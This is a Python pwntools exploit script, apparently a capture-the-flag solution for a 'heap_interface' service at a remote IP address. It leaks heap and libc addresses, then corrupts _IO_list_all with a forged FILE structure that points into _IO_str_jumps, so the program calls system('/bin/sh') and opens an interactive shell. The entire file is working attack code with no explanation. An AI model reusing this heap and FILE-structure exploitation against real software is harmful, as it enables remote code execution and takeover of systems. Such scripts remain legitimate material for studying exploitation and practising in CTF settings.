from pwn import *

#r = process(["./heap_interface"],env={"LD_PRELOAD":"./libc-2.24.so"})
r = remote("185.168.131.133", 6000)
r.sendafter(":","a"*0x20)


def malloc(idx,size):
	r.sendlineafter("4.","1")
	r.sendlineafter(":",str(size))
	r.sendlineafter(":",str(idx))

def write(idx,data):
	r.sendlineafter("4.","2")
	r.sendlineafter(":",str(idx))
	r.sendafter(":",data)


def free(idx):
	r.sendlineafter("4.","3")
	r.sendlineafter(":",str(idx))

def show():
	r.sendlineafter("4.","4")


malloc(0,0x80)
show()
r.recvuntil("a"*0x20)
heap = u64(r.recvline()[:-1].ljust(8,'\x00'))-0x10
print hex(heap)

malloc(0,0x20000)

malloc(0,0x20000)
show()
r.recvuntil("a"*0x20)
libc = u64(r.recvline()[:-1].ljust(8,'\x00')) - 0x59e010  #-0x5ce010
print hex(libc)
#r.interactive()

malloc(0,0xa0)
malloc(1,0xa0)

free(0)



system = libc + 0x45390
io_str_jumps = libc + 0x3c37a0
io_list_all = libc + 0x3c5520
binsh = libc + 0x18cd57






system = libc + 0x3f480 #0x45390
io_str_jumps = libc + 0x394500 #0x3c37a0
io_list_all = libc+ 0x398500 #0x3c5520
binsh = libc + 0x1619b9 #0x18cd57





context.arch =  "amd64"
FILE = flat(0x0,io_list_all-0x10,0x0,0x1,0x0,binsh)

write(0,FILE)
write(1,"\x00"*0x18+p64(io_str_jumps-0x8)+p64(system)*2)

malloc(0,0x300)
r.interactive()

